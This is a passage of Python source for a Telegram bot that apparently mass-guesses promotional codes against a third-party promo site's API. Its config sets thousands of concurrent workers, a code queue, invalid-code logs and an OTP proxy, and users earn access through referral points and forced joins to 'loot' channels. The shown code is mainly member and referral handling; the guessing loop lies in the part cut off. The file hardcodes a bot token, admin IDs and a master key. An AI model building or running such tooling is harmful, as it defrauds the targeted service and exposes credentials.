import requests, json, base64, hmac, hashlib, time, urllib.parse, random
import threading, queue, os
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor

# ========== CONFIG ==========
BASE_URL = "https://slayyourplaypromo.in/api/users"
MASTER_KEY = os.environ.get("SLAYPROMO_MASTER_KEY", "1709065004")
TELEGRAM_BOT_TOKEN="8776958017:AAFF5p5wpb_qP9K9arnYfMGOgx4oYkSMXoY"
ADMIN_IDS = [8739344756, 8183677305, 8101876637,1446058092]
ADMIN_ID = ADMIN_IDS[0]  # back-compat

# 150 workers per user, designed for up to 50 simultaneous users
THREADS = int(os.environ.get("SLAYPROMO_THREADS", "150"))
REQUEST_DELAY = float(os.environ.get("SLAYPROMO_REQUEST_DELAY", "0"))
# Global pool hard cap: 50 users x 150 workers = 7500 slots.
# Tasks queue inside the executor when all threads are busy — no crash, no block.
GLOBAL_SEARCH_WORKERS = int(os.environ.get("SLAYPROMO_GLOBAL_WORKERS", "2000"))
# Queue only needs to stay ~10 steps ahead per worker batch
CODE_QUEUE_SIZE = 1500
MAX_TELEGRAM_MSG = 3500  # stay under Telegram 4096 with markup headroom

FINAL_API_ENDPOINT = "getUpiNo"

# Data lives next to the script by default, or under SLAYPROMO_DATA_DIR.
# Keep the data/ folder (or members_v2.json) with the bot so redeploys reload members.
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.environ.get("SLAYPROMO_DATA_DIR") or os.path.join(_SCRIPT_DIR, "data")
os.makedirs(DATA_DIR, exist_ok=True)

AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "members_v2.json")
# Legacy locations auto-migrated on startup so GitHub/redeploy does not wipe members
LEGACY_MEMBER_FILES = [
    os.path.join(_SCRIPT_DIR, "members_v2.json"),
    os.path.join(_SCRIPT_DIR, "members.json"),
    os.path.join(_SCRIPT_DIR, "authorized_users.json"),
    os.path.join(DATA_DIR, "members.json"),
    os.path.join(DATA_DIR, "authorized_users.json"),
]
ACCESS_REQUESTS_FILE = os.path.join(DATA_DIR, "access_requests_v2.json")
REFERRALS_FILE = os.path.join(DATA_DIR, "referrals_v2.json")
USAGE_LOG_FILE = os.path.join(DATA_DIR, "usage_log.json")
INVALID_CODES_DIR = os.path.join(DATA_DIR, "invalid_codes")
os.makedirs(INVALID_CODES_DIR, exist_ok=True)
INVALID_CODES_PREFIX = os.path.join(INVALID_CODES_DIR, "invalid_codes_")
BOT_USERNAME = ""  # filled at startup
REQUIRED_CHANNELS = [
    {
        "username": "axxuloots",
        "title": "AXXU LOOTS",
        "url": "https://t.me/axxuloots",
        "button": "📢 Join AXXU LOOTS",
    },
    {
        "username": "vishalxupdate",
        "title": "𝐕𝐢𝐬𝐡𝐚𝐥 X 𝐔𝐩𝐝𝐚𝐭𝐞",
        "url": "https://t.me/vishalxupdate",
        "button": "📢 Join 𝐕𝐢𝐬𝐡𝐚𝐥 X 𝐔𝐩𝐝𝐚𝐭𝐞",
    },
    {
        "username": "SPIDEYxUpdates",
        "title": "SPIDEYx𝐔𝐩𝐝𝐚𝐭𝐞s",
        "url": "https://t.me/spideyxupdates",
        "button": "📢 Join SPIDEY x Updates",
    },
    {
    "username": "blankkdealz",
    "title": "Blankk Dealz",
    "url": "https://t.me/blankkdealz",
    "button": "📢 Join Blankk Dealz",
},
]

OTP_PROXY_HOST = os.environ.get("OTP_PROXY_HOST", "")
OTP_PROXY_PORT = os.environ.get("OTP_PROXY_PORT", "")
OTP_PROXY_USER = os.environ.get("OTP_PROXY_USER", "")
OTP_PROXY_PASS = os.environ.get("OTP_PROXY_PASS", "")
_OTP_PROXY_URL = (
    f"http://{OTP_PROXY_USER}:{OTP_PROXY_PASS}@{OTP_PROXY_HOST}:{OTP_PROXY_PORT}"
    if OTP_PROXY_HOST and OTP_PROXY_USER
    else None
)
# ============================

# Set smaller stack size (128 KB) before spawning any threads.
# Default 8 MB x 7500 threads = 60 GB virtual; 128 KB x 7500 = ~900 MB — safe.
threading.stack_size(131072)

# Global search pool shared across all users. _POOL_MAX = 50 users x THREADS + headroom.
# Extra submissions queue inside the executor — no unbounded thread creation.
_POOL_MAX = max(GLOBAL_SEARCH_WORKERS, THREADS * 50, 7500)
_search_pool = ThreadPoolExecutor(max_workers=_POOL_MAX, thread_name_prefix="search")


def _now():
    return datetime.now(timezone.utc)


def _iso(dt):
    return dt.astimezone(timezone.utc).isoformat()


def _parse_iso(s):
    if not s:
        return None
    try:
        return datetime.fromisoformat(s)
    except Exception:
        return None


def _atomic_json_write(path, obj):
    """Write JSON safely so a crash mid-write never corrupts members data."""
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


def _normalize_users_map(raw):
    """Accept several historical shapes and return {str_id: profile}."""
    if not isinstance(raw, dict):
        return {}
    if isinstance(raw.get("users"), dict):
        src = raw["users"]
    else:
        # flat map of id -> profile
        src = raw
    out = {}
    for k, v in src.items():
        if str(k).startswith("_"):
            continue
        if not isinstance(v, dict):
            continue
        # skip non-user keys
        if not str(k).lstrip("-").isdigit() and k not in ("users",):
            # still allow if looks like telegram id
            if not str(k).isdigit():
                continue
        key = str(k)
        if not key.lstrip("-").isdigit():
            continue
        prof = dict(v)
        prof.setdefault("expires_at", None)
        prof.setdefault("referred_by", "")
        prof.setdefault("name", "")
        prof.setdefault("username", "")
        prof.setdefault("points_balance", 0)
        try:
            prof["points_balance"] = int(prof.get("points_balance", 0) or 0)
        except Exception:
            prof["points_balance"] = 0
        # Members present in store are treated as approved unless explicitly false
        if "approved" not in prof:
            prof["approved"] = True
        else:
            prof["approved"] = bool(prof.get("approved"))
        prof.setdefault("successful_refers", 0)
        prof.setdefault("created_at", _iso(_now()))
        out[key] = prof
    return out


def _load_users_from_path(path):
    if not path or not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return _normalize_users_map(data)
    except Exception as e:
        print(f"[DATA] failed to load {path}: {e}")
        return {}


def load_authorized_users():
    """Load members from data/members_v2.json and merge any legacy files.

    This keeps member data across GitHub uploads / redeploys as long as the
    data folder (or a legacy members JSON next to the script) is present.
    """
    merged = {}
    # Prefer primary file first, then fill gaps from legacy stores
    primary = _load_users_from_path(AUTHORIZED_USERS_FILE)
    merged.update(primary)
    for path in LEGACY_MEMBER_FILES:
        if os.path.abspath(path) == os.path.abspath(AUTHORIZED_USERS_FILE):
            continue
        legacy = _load_users_from_path(path)
        for k, v in legacy.items():
            if k not in merged:
                merged[k] = v
            else:
                # keep richer profile fields
                cur = merged[k]
                for field in ("name", "username", "referred_by", "expires_at", "created_at"):
                    if not cur.get(field) and v.get(field):
                        cur[field] = v[field]
                cur["successful_refers"] = max(
                    int(cur.get("successful_refers", 0) or 0),
                    int(v.get("successful_refers", 0) or 0),
                )
                try:
                    cur["days_total"] = max(
                        float(cur.get("days_total", 0) or 0),
                        float(v.get("days_total", 0) or 0),
                    )
                except Exception:
                    pass
                try:
                    cur["hours_total"] = max(
                        float(cur.get("hours_total", 0) or 0),
                        float(v.get("hours_total", 0) or 0),
                    )
                except Exception:
                    pass
                cur["approved"] = bool(cur.get("approved") or v.get("approved"))
                merged[k] = cur
    # Optional seed from env (base64 JSON) for cloud deploys without a volume
    seed_b64 = os.environ.get("SLAYPROMO_MEMBERS_SEED_B64", "").strip()
    if seed_b64:
        try:
            seed = json.loads(base64.b64decode(seed_b64).decode("utf-8"))
            for k, v in _normalize_users_map(seed).items():
                if k not in merged:
                    merged[k] = v
            print(f"[DATA] merged seed members from SLAYPROMO_MEMBERS_SEED_B64")
        except Exception as e:
            print(f"[DATA] seed load failed: {e}")
    print(f"[DATA] loaded {len(merged)} members (primary={AUTHORIZED_USERS_FILE})")
    return merged


def save_authorized_users(users_map):
    _atomic_json_write(AUTHORIZED_USERS_FILE, {"users": users_map, "updated_at": _iso(_now())})
    # Also mirror next to script for simple GitHub/data-folder workflows
    mirror = os.path.join(_SCRIPT_DIR, "members_v2.json")
    try:
        if os.path.abspath(mirror) != os.path.abspath(AUTHORIZED_USERS_FILE):
            _atomic_json_write(mirror, {"users": users_map, "updated_at": _iso(_now())})
    except Exception as e:
        print(f"[DATA] mirror save skipped: {e}")


authorized_users = load_authorized_users()
for _aid in ADMIN_IDS:
    prev = authorized_users.get(str(_aid), {})
    authorized_users[str(_aid)] = {
        "expires_at": None,
        "referred_by": "",
        "name": prev.get("name") or "Admin",
        "username": prev.get("username") or "",
        "points_balance": 999999,  # Unlimited for admin
        "approved": True,
        "successful_refers": int(prev.get("successful_refers", 0) or 0),
        "created_at": prev.get("created_at", _iso(_now())),
        "is_admin": True,
    }
try:
    save_authorized_users(authorized_users)
except Exception as e:
    print(f"[DATA] initial save failed (will retry on next write): {e}")
users_lock = threading.Lock()


def is_admin(chat_id):
    try:
        return int(chat_id) in ADMIN_IDS
    except Exception:
        return False


def load_access_requests():
    if os.path.exists(ACCESS_REQUESTS_FILE):
        try:
            with open(ACCESS_REQUESTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict) and isinstance(data.get("requests"), list):
                    return data["requests"]
        except Exception:
            pass
    return []


def save_access_requests(reqs):
    _atomic_json_write(ACCESS_REQUESTS_FILE, {"requests": reqs})


access_requests = load_access_requests()
requests_lock = threading.Lock()


def load_referrals():
    if os.path.exists(REFERRALS_FILE):
        try:
            with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    data.setdefault("pending", {})
                    data.setdefault("completed", [])
                    return data
        except Exception:
            pass
    # legacy next to script
    legacy = os.path.join(_SCRIPT_DIR, "referrals_v2.json")
    if os.path.exists(legacy):
        try:
            with open(legacy, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    data.setdefault("pending", {})
                    data.setdefault("completed", [])
                    return data
        except Exception:
            pass
    return {"pending": {}, "completed": []}


def save_referrals(data):
    _atomic_json_write(REFERRALS_FILE, data)


referrals = load_referrals()
referrals_lock = threading.Lock()

admin_pending_input = {}
admin_pending_lock = threading.Lock()

# Referral reward is points. 1 successful refer = 1 point.
REFERRAL_POINTS = int(os.environ.get("SLAYPROMO_REFERRAL_POINTS", "2"))
# Admin default grant when points not specified
ADMIN_GRANT_POINTS = int(os.environ.get("SLAYPROMO_ADMIN_GRANT_POINTS", "1"))
# Back-compat: legacy aliases (kept for data migration)
REFERRAL_HOURS = REFERRAL_POINTS
ADMIN_GRANT_HOURS = ADMIN_GRANT_POINTS
REFERRAL_DAYS = REFERRAL_POINTS
ADMIN_GRANT_DAYS = ADMIN_GRANT_POINTS


def _fmt_points(points=None):
    """Human label for points amount, e.g. '2 points' or '1 point'."""
    p = ADMIN_GRANT_POINTS if points is None else points
    try:
        p = float(p)
    except Exception:
        p = ADMIN_GRANT_POINTS
    if p == int(p):
        p_i = int(p)
        return f"{p_i} point" if p_i == 1 else f"{p_i} points"
    return f"{p:g} points"


def _fmt_reward(points=None):
    """Human label for referral reward, e.g. '+2 points'."""
    p = REFERRAL_POINTS if points is None else points
    try:
        p = float(p)
    except Exception:
        p = REFERRAL_POINTS
    if p == int(p):
        p_i = int(p)
        return f"+{p_i} point" if p_i == 1 else f"+{p_i} points"
    return f"+{p:g} points"


def _parse_points_token(token):
    """Parse a points token from admin input. Returns int or None.
    Accepts: 5, 2, 10, etc.
    """
    if token is None:
        return None
    s = str(token).strip().lower()
    # Strip any trailing text like 'pts', 'points', 'p'
    for suf in ("points", "point", "pts", "p"):
        if s.endswith(suf):
            s = s[: -len(suf)].strip()
            break
    if not s:
        return None
    try:
        p = float(s)
    except Exception:
        return None
    if p <= 0 or p > 999999:
        return None
    return int(p) if p == int(p) else p


def admin_grant_user(gid, points=None):
    """Grant points to a user. Returns (ok, message_for_admin)."""
    if points is None:
        points = ADMIN_GRANT_POINTS
    try:
        points = float(points)
        gid = int(gid)
    except Exception:
        return False, "❌ Bad user id or points."
    if points <= 0:
        return False, "❌ Points must be > 0."
    if gid <= 0:
        return False, "❌ Bad user id."
    if gid in ADMIN_IDS:
        return False, "⚠️ Can't grant to admin."
    grant_points(gid, points=points, auto_approve=True)
    set_request_status(gid, "approved")
    rewarded = complete_referral_if_any(gid)
    extra = f"\n🎉 Referrer `{rewarded}` got {_fmt_reward()}." if rewarded else ""
    try:
        send_telegram(
            gid,
            (
                "🎁 *Admin granted you access!*\n"
                "────────────────\n"
                f"💎 Added: *{_fmt_points(points)}*\n"
                f"Status: {access_info(gid)}\n"
                "_Stay joined in both channels or access pauses._"
            ),
            main_menu_keyboard(),
        )
    except Exception:
        pass
    msg = (
        f"✅ Granted *{_fmt_points(points)}* to `{gid}`.\n"
        f"💎 {access_info(gid)}{extra}"
    )
    return True, msg


def _fmt_duration_left(left):
    return "Legacy points"


def grant_points(chat_id, points=None, name="", username="", referred_by="", auto_approve=False):
    """Add points to a user."""
    if points is None:
        points = REFERRAL_POINTS
    if is_admin(chat_id):
        return None
    with users_lock:
        key = str(int(chat_id))
        u = authorized_users.get(key, {
            "referred_by": "",
            "name": "",
            "username": "",
            "points_balance": 0,
            "approved": False,
            "successful_refers": 0,
            "created_at": _iso(_now()),
        })
        u.setdefault("points_balance", 0)
        u.setdefault("approved", False)
        if name:
            u["name"] = name
        if username:
            u["username"] = username
        if referred_by and not u.get("referred_by"):
            u["referred_by"] = str(referred_by)
        u["approved"] = True
        u["points_balance"] = int(u.get("points_balance", 0) or 0) + int(points)
        authorized_users[key] = u
        save_authorized_users(authorized_users)
    return True


# Back-compat aliases
def grant_access_hours(cid, hours=None, **kwargs):
    return grant_points(cid, points=hours, **kwargs)

def grant_access_days(cid, days=None, **kwargs):
    p = float(days or 1)
    return grant_points(cid, points=p, **kwargs)


def revoke_access(chat_id):
    if is_admin(chat_id):
        return False
    with users_lock:
        key = str(int(chat_id))
        if key in authorized_users:
            del authorized_users[key]
            save_authorized_users(authorized_users)
            return True
        return False


def is_approved(chat_id):
    if is_admin(chat_id):
        return True
    with users_lock:
        u = authorized_users.get(str(int(chat_id)))
        return bool(u and u.get("approved"))


def is_authorized(chat_id):
    """Can use bot tools right now.
    Admin: always.
    Users: approved + points balance > 0.
    """
    if is_admin(chat_id):
        return True
    with users_lock:
        u = authorized_users.get(str(int(chat_id)))
        if not u or not u.get("approved"):
            return False
        return int(u.get("points_balance", 0) or 0) > 0


def access_info(chat_id):
    if is_admin(chat_id):
        return "Admin · unlimited"
    with users_lock:
        u = authorized_users.get(str(int(chat_id)))
        if not u:
            return "Not approved"
        if not u.get("approved"):
            return "Not approved"
        pts = int(u.get("points_balance", 0) or 0)
        if pts <= 0:
            return f"Approved · no points · refer 1 friend for {_fmt_reward()}"
        return f"{_fmt_points(pts)} available"


def get_successful_refers(chat_id):
    with users_lock:
        return int((authorized_users.get(str(int(chat_id))) or {}).get("successful_refers", 0) or 0)


def bot_refer_link(uid):
    uname = BOT_USERNAME or "bot"
    return f"https://t.me/{uname}?start=ref_{uid}"


def auto_approve_member(chat_id, username="", first_name="", referred_by=""):
    """Open access without admin request — used after channel join is verified.
    Still no free time: user must refer or receive /grant.
    """
    if is_admin(chat_id):
        return
    with users_lock:
        key = str(int(chat_id))
        u = authorized_users.get(key, {
            "referred_by": "",
            "name": "",
            "username": "",
            "points_balance": 0,
            "approved": False,
            "successful_refers": 0,
            "created_at": _iso(_now()),
        })
        u.setdefault("successful_refers", 0)
        u.setdefault("points_balance", 0)
        was_new = not u.get("approved")
        u["approved"] = True
        if first_name:
            u["name"] = first_name
        if username:
            u["username"] = username
        if referred_by and not u.get("referred_by"):
            u["referred_by"] = str(referred_by)
        authorized_users[key] = u
        save_authorized_users(authorized_users)
    if was_new:
        # reward referrer once when member first auto-approves
        complete_referral_if_any(chat_id)
    return was_new


def store_access_request(chat_id, username="", first_name="", referred_by=""):
    # kept for admin history only — users no longer need to request
    # Upsert by user id so Verify Membership does not flood duplicates
    with requests_lock:
        found = None
        for r in access_requests:
            if int(r.get("id", 0)) == int(chat_id):
                # prefer pending, else most recent matching id
                if r.get("status") == "pending" or found is None:
                    found = r
        now = _iso(_now())
        if found:
            found["username"] = username or found.get("username") or ""
            found["name"] = first_name or found.get("name") or ""
            found["updated_at"] = now
            if found.get("status") in (None, "", "pending", "denied"):
                found["status"] = "auto_approved"
            if referred_by and not found.get("referred_by"):
                found["referred_by"] = str(referred_by)
        else:
            access_requests.append({
                "id": int(chat_id),
                "username": username or "",
                "name": first_name or "",
                "status": "auto_approved",
                "referred_by": str(referred_by) if referred_by else "",
                "created_at": now,
                "updated_at": now,
            })
        save_access_requests(access_requests)


def set_request_status(chat_id, status):
    with requests_lock:
        for r in access_requests:
            if int(r.get("id", 0)) == int(chat_id) and r.get("status") in ("pending", "auto_approved"):
                r["status"] = status
                r["updated_at"] = _iso(_now())
        save_access_requests(access_requests)


def pending_requests():
    with requests_lock:
        return [r for r in access_requests if r.get("status") == "pending"]


def all_requests_sorted(limit=50):
    with requests_lock:
        reqs = list(access_requests)
    reqs.sort(key=lambda r: r.get("updated_at") or r.get("created_at") or "", reverse=True)
    return reqs[:limit]


def format_requests_page():
    pending = pending_requests()
    recent = all_requests_sorted(40)
    lines = [
        "📥 *Member Log*",
        "",
        f"⏳ Pending: *{len(pending)}*   ·   🗂 Total: *{len(access_requests)}*",
        "_Auto-approve after channel join — no request step._",
        "────────────────",
    ]
    if not recent:
        lines.append("_No records yet._")
    else:
        for r in recent:
            st = r.get("status", "?")
            icon = {"pending": "⏳", "approved": "✅", "auto_approved": "✅", "denied": "❌"}.get(st, "•")
            uname = r.get("username") or "N/A"
            name = (r.get("name") or "").replace("*", "").replace("_", "").replace("`", "")
            ref = r.get("referred_by") or "-"
            lines.append(f"{icon} `{r.get('id')}` · @{uname}")
            lines.append(f"   {name} · {st} · ref:`{ref}`")
            lines.append(f"   {(r.get('created_at') or '')[:19]}")
    lines.append("────────────────")
    lines.append("Grant points: `/grant <id> [points]` or *Grant Points*")
    lines.append(f"Rule: *1 refer = {_fmt_reward()}* · default admin grant *{_fmt_points(ADMIN_GRANT_POINTS)}*")
    return "\n".join(lines)


def requests_keyboard():
    rows = []
    for r in pending_requests()[:20]:
        uid = r.get("id")
        uname = r.get("username") or str(uid)
        rows.append([
            f"✅ {uid}",
            f"❌ {uid}",
        ])
    rows.append(["🔄 Refresh Log"])
    rows.append(["⬅️ Dashboard"])
    return {"keyboard": rows, "resize_keyboard": True, "one_time_keyboard": True}


def _access_info_from_profile(uid, prof):
    """Like access_info but uses an already-copied profile (no lock)."""
    if str(uid).lstrip("-").isdigit() and int(uid) in ADMIN_IDS:
        return "Admin · unlimited"
    if not prof:
        return "Not approved"
    if not prof.get("approved"):
        return "Not approved"
    pts = int(prof.get("points_balance", 0) or 0)
    if pts <= 0:
        return f"Approved · 0 points · refer for {_fmt_reward()}"
    return f"{_fmt_points(pts)} available"


def format_users_pages(page=0, page_size=25):
    """Paginate users so Telegram message limit never blocks the Users button."""
    # Copy under lock, format outside — never call access_info while holding users_lock
    with users_lock:
        items = sorted(
            ((str(k), dict(v) if isinstance(v, dict) else {}) for k, v in authorized_users.items()),
            key=lambda kv: kv[0],
        )
    total = len(items)
    if total == 0:
        return ["👥 *Users* (0)\n_No members yet._"], 0, 1

    total_pages = (total + page_size - 1) // page_size
    page = max(0, min(int(page or 0), total_pages - 1))
    start = page * page_size
    chunk = items[start:start + page_size]
    lines = [f"👥 *Users* ({total}) · page {page + 1}/{total_pages}"]
    for uid, prof in chunk:
        tag = " 👑" if str(uid).lstrip("-").isdigit() and int(uid) in ADMIN_IDS else ""
        name = (prof.get("name") or "").replace("*", "").replace("_", "").replace("`", "")
        uname = (prof.get("username") or "").replace("*", "").replace("_", "").replace("`", "")
        info = _access_info_from_profile(uid, prof)
        who = f"@{uname}" if uname else (name or "-")
        lines.append(f"• `{uid}`{tag} · {who}")
        lines.append(f"  {info}")
    return ["\n".join(lines)], page, total_pages


def users_list_keyboard(page, total_pages):
    rows = []
    nav = []
    if page > 0:
        nav.append(f"⬅️ Prev ({page})")
    if page < total_pages - 1:
        nav.append(f"Next ➡️ ({page})")
    if nav:
        rows.append(nav)
    rows.append([f"🔄 Refresh ({page})"])
    rows.append(["⬅️ Dashboard"])
    return {"keyboard": rows, "resize_keyboard": True, "one_time_keyboard": True}


def send_users_list(chat_id, page=0):
    try:
        pages, page, total_pages = format_users_pages(page=page)
        total_pages = max(1, int(total_pages or 1))
        page = max(0, min(int(page or 0), total_pages - 1))
        text = pages[0] if pages else "👥 *Users* (0)\n_No members yet._"
    except Exception as e:
        print(f"[USERS] format failed: {e}")
        send_telegram(chat_id, f"❌ Failed to load users list: `{e}`", admin_keyboard())
        return
    # hard split if a single page is still huge
    if len(text) > MAX_TELEGRAM_MSG:
        chunks = []
        buf = []
        size = 0
        for line in text.split("\n"):
            add = len(line) + 1
            if size + add > MAX_TELEGRAM_MSG and buf:
                chunks.append("\n".join(buf))
                buf = [line]
                size = add
            else:
                buf.append(line)
                size += add
        if buf:
            chunks.append("\n".join(buf))
        for i, chunk in enumerate(chunks):
            kb = users_list_keyboard(page, total_pages) if i == len(chunks) - 1 else None
            send_telegram(chat_id, chunk, kb)
    else:
        send_telegram(chat_id, text, users_list_keyboard(page, total_pages))


def get_referrer_for_user(new_uid):
    uid = str(int(new_uid))
    with referrals_lock:
        ref = referrals.get("pending", {}).get(uid)
        if ref and str(ref).strip().isdigit():
            return str(int(ref))
    with requests_lock:
        candidates = [
            r for r in access_requests
            if int(r.get("id", 0)) == int(new_uid) and str(r.get("referred_by") or "").strip().isdigit()
        ]
        if candidates:
            candidates.sort(key=lambda r: r.get("updated_at") or r.get("created_at") or "", reverse=True)
            return str(int(candidates[0]["referred_by"]))
    with users_lock:
        u = authorized_users.get(uid) or {}
        ref = str(u.get("referred_by") or "").strip()
        if ref.isdigit():
            return str(int(ref))
    return None


def already_rewarded_referral(new_uid):
    uid = str(int(new_uid))
    with referrals_lock:
        for c in referrals.get("completed", []):
            if str(c.get("new_user")) == uid:
                return True
    return False


def complete_referral_if_any(new_uid):
    """Reward referrer once. Check+mark completed under one lock (no double credit)."""
    try:
        new_id = int(new_uid)
    except Exception:
        return None

    ref = get_referrer_for_user(new_id)
    if not ref:
        return None
    try:
        ref_id = int(ref)
    except Exception:
        return None
    if ref_id == new_id:
        return None

    # Atomic reserve: only one caller can mark this new_user completed
    with referrals_lock:
        for c in referrals.get("completed", []):
            if str(c.get("new_user")) == str(new_id):
                return None  # already rewarded
        referrals.get("pending", {}).pop(str(new_id), None)
        if is_admin(ref_id):
            referrals.setdefault("completed", []).append({
                "referrer": str(ref_id),
                "new_user": str(new_id),
                "at": _iso(_now()),
                "reward": "admin_skip",
            })
            save_referrals(referrals)
            return ref_id
        referrals.setdefault("completed", []).append({
            "referrer": str(ref_id),
            "new_user": str(new_id),
            "at": _iso(_now()),
            "reward_points": REFERRAL_POINTS,
        })
        stats = referrals.setdefault("stats", {})
        st = stats.setdefault(str(ref_id), {"successful": 0, "points_earned": 0})
        st["successful"] = int(st.get("successful", 0)) + 1
        st["points_earned"] = int(st.get("points_earned", 0) or 0) + int(REFERRAL_POINTS)
        save_referrals(referrals)

    with users_lock:
        key = str(ref_id)
        u = authorized_users.get(key, {
            "expires_at": None,
            "referred_by": "",
            "name": "",
            "username": "",
            "days_total": 0,
            "hours_total": 0,
            "approved": False,
            "created_at": _iso(_now()),
            "successful_refers": 0,
        })
        u["successful_refers"] = int(u.get("successful_refers", 0)) + 1
        authorized_users[key] = u
        save_authorized_users(authorized_users)

    grant_points(ref_id, points=REFERRAL_POINTS)
    try:
        with users_lock:
            sc = (authorized_users.get(str(ref_id)) or {}).get("successful_refers", 0)
        send_telegram(
            ref_id,
            (
                "🎉 *Referral unlocked!*\n"
                "────────────────\n"
                f"👤 Friend `{new_id}` joined via your link\n\n"
                f"🎁 Reward: *{_fmt_reward()}*\n"
                f"👥 Successful refers: *{sc}*\n"
                f"💎 Status: {access_info(ref_id)}\n"
                "────────────────\n"
                "⚠️ Stay in both channels or access pauses"
            ),
            admin_keyboard() if is_admin(ref_id) else main_menu_keyboard(),
        )
        print(f"[REFERRAL] rewarded referrer={ref_id} for new_user={new_id} +{REFERRAL_POINTS} points")
    except Exception as e:
        print(f"[REFERRAL] notify failed: {e}")
    return ref_id


def mark_approved(uid, name="", username="", referred_by=""):
    if is_admin(uid):
        return
    with users_lock:
        key = str(int(uid))
        u = authorized_users.get(key, {
            "expires_at": None,
            "referred_by": "",
            "name": "",
            "username": "",
            "days_total": 0,
            "hours_total": 0,
            "approved": False,
            "successful_refers": 0,
            "created_at": _iso(_now()),
        })
        u.setdefault("successful_refers", 0)
        u.setdefault("days_total", 0)
        u.setdefault("hours_total", 0)
        u["approved"] = True
        if name:
            u["name"] = name
        if username:
            u["username"] = username
        if referred_by and not u.get("referred_by"):
            u["referred_by"] = str(referred_by)
        # removed: `if u.get("expires_at") is None: u["expires_at"] = None` — was a no-op
        authorized_users[key] = u
        save_authorized_users(authorized_users)


def approve_user(uid, name="", username=""):
    ref_by = get_referrer_for_user(uid) or ""
    mark_approved(uid, name=name, username=username, referred_by=ref_by)
    set_request_status(uid, "approved")
    rewarded = complete_referral_if_any(uid)
    if rewarded:
        print(f"[REFERRAL] approve_user rewarded referrer={rewarded} for {uid}")
    link = bot_refer_link(uid)
    send_telegram(
        uid,
        (
            "🎉 *You're in!*\n"
            "────────────────\n"
            "✅ Membership verified\n"
            "⏳ Points: *none yet*\n\n"
            f"🎁 Earn access: invite 1 friend → *{_fmt_reward()}*\n\n"
            f"🔗 *Your invite link*\n`{link}`\n\n"
            "📌 Friend must join *both* channels\n"
            "⚠️ Leave a channel → bot stops"
        ),
        main_menu_keyboard(),
    )


# ---------- Telegram helpers ----------
def _raw_send(chat_id, message, reply_markup=None, disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    # Telegram hard limit 4096
    text = message if len(message) <= 4096 else message[:4090] + "…"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown",
        "disable_web_page_preview": bool(disable_web_page_preview),
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)

    def _post(p):
        r = requests.post(url, json=p, timeout=10)
        try:
            j = r.json() if r.content else {}
        except Exception:
            j = {}
        if not isinstance(j, dict):
            j = {}
        return r, j

    try:
        r, j = _post(payload)
        ok = bool(j.get("ok")) if j else (r.status_code == 200)
        # Fallback without Markdown if parse entities fail (underscores in names, etc.)
        if not ok:
            payload.pop("parse_mode", None)
            r2, j2 = _post(payload)
            if j2.get("ok") or r2.status_code == 200:
                return r2
            print(f"Send error to {chat_id}: {r2.status_code} {str(j2)[:200] or r2.text[:200]}")
            return r2
        return r
    except Exception as e:
        print(f"Send error to {chat_id}: {e}")
        return None


# ---------- Global Telegram send queue ----------
# All outgoing messages are serialised through this queue and sent by a single
# persistent daemon thread.  This replaces the old "spawn a thread per message"
# pattern that caused RuntimeError: can't start new thread under load.
_tg_send_queue: queue.Queue = queue.Queue()


def _tg_sender_loop():
    while True:
        try:
            args = _tg_send_queue.get()
            if args is None:          # poison pill — exit (never sent in normal use)
                break
            try:
                _raw_send(*args)
            except Exception:
                pass
            finally:
                _tg_send_queue.task_done()
        except Exception:
            pass


_tg_sender_thread = threading.Thread(target=_tg_sender_loop, daemon=True, name="tg-sender")
_tg_sender_thread.start()


def send_telegram(chat_id, message, reply_markup=None, disable_web_page_preview=False):
    _tg_send_queue.put((chat_id, message, reply_markup, disable_web_page_preview))


def answer_callback_query(callback_query_id, text=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_query_id}
    if text:
        payload["text"] = text[:180]
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass


# ---------- Channel membership check ----------
JOINED_STATUSES = {"creator", "administrator", "member", "restricted"}
_membership_cache = {}
_membership_cache_lock = threading.Lock()
MEMBERSHIP_CACHE_TTL = 30


def channel_username(channel):
    return channel.get("username") or ""


def get_channel_display_name(channel):
    return channel.get("title") or channel.get("username") or "channel"


def get_channel_link(channel):
    return channel.get("url") or f"https://t.me/{channel_username(channel)}"


def get_channel_button_text(channel, joined=False):
    if joined:
        return f"✅ {get_channel_display_name(channel)}"
    return channel.get("button") or f"📢 Join {get_channel_display_name(channel)}"


def check_channel_membership(chat_id):
    """Bot must be admin in each required channel for getChatMember to work."""
    unjoined = []
    status_map = {}
    for ch in REQUIRED_CHANNELS:
        uname = channel_username(ch)
        status = "left"
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
            r = requests.get(url, params={"chat_id": f"@{uname}", "user_id": int(chat_id)}, timeout=8)
            j = r.json()
            if j.get("ok"):
                status = (j.get("result") or {}).get("status") or "left"
            else:
                status = "unknown"
        except Exception:
            status = "unknown"
        status_map[uname] = status
        # "unknown" means Telegram API failed/timed out -- do NOT penalise user for our API error
        if status not in JOINED_STATUSES and status != "unknown":
            unjoined.append(ch)
    all_joined = len(unjoined) == 0
    return all_joined, unjoined, status_map


def check_channel_membership_cached(chat_id, force=False):
    key = str(int(chat_id))
    now = time.time()
    with _membership_cache_lock:
        hit = _membership_cache.get(key)
        if hit and not force and (now - hit["ts"] < MEMBERSHIP_CACHE_TTL):
            return hit["all_joined"], hit["unjoined"], hit["status_map"]
    all_joined, unjoined, status_map = check_channel_membership(chat_id)
    with _membership_cache_lock:
        _membership_cache[key] = {
            "ts": now,
            "all_joined": all_joined,
            "unjoined": unjoined,
            "status_map": status_map,
